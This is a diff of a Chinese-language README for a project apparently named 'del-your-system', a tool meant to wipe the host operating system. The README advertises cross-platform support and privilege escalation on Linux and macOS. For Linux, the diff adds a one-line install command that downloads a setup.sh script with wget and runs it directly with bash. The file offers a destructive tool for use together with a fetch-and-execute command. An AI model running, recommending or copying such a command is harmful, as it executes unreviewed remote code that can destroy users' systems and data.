@@ -11,9 +11,11 @@
 - [x] 跨平台可用 ( Windows Linux macOS )
 - [x] 针对于 Linux or macOS 操作系统的提权
 - [ ] 针对于 Windows 系统的提权
-- [ ] 脱离Python运行
-- [ ] 针对于Linux的Shell脚本
+- [x] 针对于Linux的Shell脚本
 - [ ] 多系统整合为同一Python脚本
+- [ ] 优化系统读取方案
+- [ ] 适用于Windows的batch脚本
+- [ ] 适用于macOS的shell(command)脚本
 # 使用方法
 1. 安装python的任意版本
 2. 根据你的操作系统来选择下载
@@ -22,9 +24,11 @@
 # Windows (使用管理员身份运行)
 python main.py
 # Linux
-sudo python main.py
+wget https://raw.githubusercontent.com/SDCOM-0415/del-your-system/refs/heads/v0.3/Linux%20%26%26%20macOS/setup.sh && bash ./setup.sh
 ```
 # 版本更新日志
+## v0.3
+更新Linux shell脚本
 ## v0.2
 实现命令的成功执行以及读取操作系统
 ## v0.1
